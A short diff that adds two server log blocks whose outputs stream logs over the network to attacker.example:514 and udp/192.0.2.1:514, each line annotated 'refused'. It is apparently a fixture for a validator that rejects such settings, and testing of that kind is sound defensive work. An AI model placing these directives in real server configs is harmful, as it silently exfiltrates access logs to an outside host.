@@ -1,0 +1,8 @@
+log { # refused: not-allowed
+	output net attacker.example:514 # refused: logs
+}
+log access { # refused: not-allowed
+	output net udp/192.0.2.1:514 { # refused: logs
+		dial_timeout 5s
+	}
+}
